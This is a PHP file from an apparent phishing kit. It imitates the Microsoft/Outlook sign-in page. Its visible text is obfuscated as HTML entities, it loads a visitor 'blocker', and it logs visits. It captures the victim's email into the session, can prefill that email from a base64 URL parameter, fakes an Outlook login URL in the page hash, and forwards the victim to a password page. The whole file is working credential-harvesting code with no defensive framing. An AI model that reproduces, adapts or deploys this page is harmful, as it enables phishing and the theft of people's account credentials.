<?php
session_start();
require 'core/functions.php';
require 'core/blocker.php';

logger("[VISIT] {$_SERVER['REQUEST_URI']} - 200");

if(isset($_SESSION['email'])) {
    echo '<script>window.location = "pass.php";</script>';
    exit();
}

if(isset($_POST['user'])) {
    logger("[LOGIN] {$_SERVER['REQUEST_URI']} - 200");

    $_SESSION['email'] = base64_encode($_POST['user']);

    print json_encode(['success' => true]);
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>&#83;&#105;&#103;&#110; &#105;&#110; &#116;&#111; &#121;&#111;&#117;&#114; &#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116; &#97;&#99;&#99;&#111;&#117;&#110;&#116;</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="assets/images/favicon.ico">
    <link rel="stylesheet" href="assets/css/bootstrap.css">
    <link rel="stylesheet" href="assets/css/login.css">
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/popper.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
</head>
<body>
  
<div class="container-fluid">
    <div class="row d-flex align-items-center">
        <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
            <div class="card">
                <div class="card-body">
                    <img src="assets/images/logo.svg">
                    <h4>&#83;&#105;&#103;&#110; &#73;&#110;</h4>
                    <form method="POST">
                        <div class="form-group">
                            <input type="text" class="form-control" id="user" name="user" placeholder="Email, phone, or Skype" value="<?php echo (isset($_GET['cngmail']) ? base64_decode($_GET['cngmail']) : '') ?>" required>
                            <p>&#78;&#111; &#97;&#99;&#99;&#111;&#117;&#110;&#116;? <a href="#">&#67;&#114;&#101;&#97;&#116;&#101; &#111;&#110;&#101;!</a></p>
                        </div>
                        <button type="submit" class="btn float-right">&#78;&#101;&#120;&#116;</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <p><img src="assets/images/ellipsis_white.svg"></p>
    <p>&#80;&#114;&#105;&#118;&#97;&#99;&#121; & &#99;&#111;&#111;&#107;&#105;&#101;&#115;</p>
    <p>&#84;&#101;&#114;&#109;&#115; &#111;&#102; &#117;&#115;&#101;</p>
    <p>©<?php echo date('Y'); ?> &#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;</p>
</div>

<script>
    location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015';

    $(function() {
        $(document).on('focus', '.form-control', function() {
            $(this).css({'border-bottom': '1px solid #0067b8'});
        });

        $(document).on('blur', '.form-control', function() {
            $(this).css({'border-bottom': ''});
        });

        $(document).on('submit', 'form', function(event) {
            event.preventDefault();

            var user = $('#user').val();
            
            $.post('<?php echo $_SERVER['PHP_SELF'] ?>', {user: user}, function(data) {
                data = JSON.parse(data);

                if(data.success == true) {
                    window.location = 'pass.php';
                }
            });
        });
    });
</script>

</body>
</html>
